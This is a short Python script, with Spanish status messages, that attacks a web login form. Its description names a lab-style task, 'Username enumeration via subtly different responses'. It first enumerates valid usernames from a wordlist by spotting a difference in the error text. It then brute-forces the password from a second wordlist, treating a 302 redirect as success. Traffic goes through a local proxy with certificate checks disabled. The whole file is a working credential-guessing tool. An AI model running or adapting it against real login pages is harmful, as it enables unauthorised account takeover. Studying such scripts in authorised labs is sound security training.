#!/usr/bin/env python3

import requests
import sys 
import urllib3
import json
import signal
import time
import pdb
import argparse
from termcolor import colored
from pwn import *

# Ctrl + C

def def_handler(sig, frame):

    print(f"\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# HTTPS problema

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def get_arguments():

    parser = argparse.ArgumentParser(description='Username enumeration via subtly different responses')
    parser.add_argument("-t", "--target",dest="target", required=True, help="Victim panel login url (Ex: -t www.example.com/login)")
    parser.add_argument("-uf", "--usersfile",dest="usersfile", required=True, help="File contain usernames")
    parser.add_argument("-pf", "--passwordsfile",dest="passwordsfile", required=True, help="File contain passwords")

    options = parser.parse_args()

    return options.target, options.usersfile, options.passwordsfile

def user_validation(s, target, usersfile):

    with open(usersfile, "r") as u:
        usernames = u.read().split("\n")

    p1 = log.progress("Validating Users")
    p1.status("Iniciando Proceso de Validacion de Usuario")

    time.sleep(2)

    for username in usernames:

        post_data = {
            "username": "%s" % username, 
            "password": "test"
        }

        r = s.post(target, data=post_data)

        if "Invalid username or password." not in r.text:
            correct_username = username
            break

    return correct_username

def brute_force(s, target, correct_username, passwordsfile):

    correct_password = ''

    with open(passwordsfile, "r") as p:
        passwords = p.read().split("\n")

    p2 = log.progress("Validation Password")
    p2.status(f"Iniciando proceso de Validacion de Password")

    time.sleep(2)

    for password in passwords:

        post_data = {

            "username": correct_username,
            "password": "%s" % password
        }

        r = s.post(target, data=post_data, allow_redirects=False, proxies=proxies)

        if r.status_code == 302:
            correct_password = password
            break

    return correct_password        

def main():
    
    s = requests.session()
    s.verify = False
    target, usersfile, passwordsfile = get_arguments()

    correct_username = user_validation(s, target, usersfile)
    correct_password = brute_force(s, target, correct_username, passwordsfile)
    print(colored(f"\n[+] El usuario correcto es '{correct_username}' y su password es '{correct_password}'", "green"))


if __name__ == '__main__':

    main()
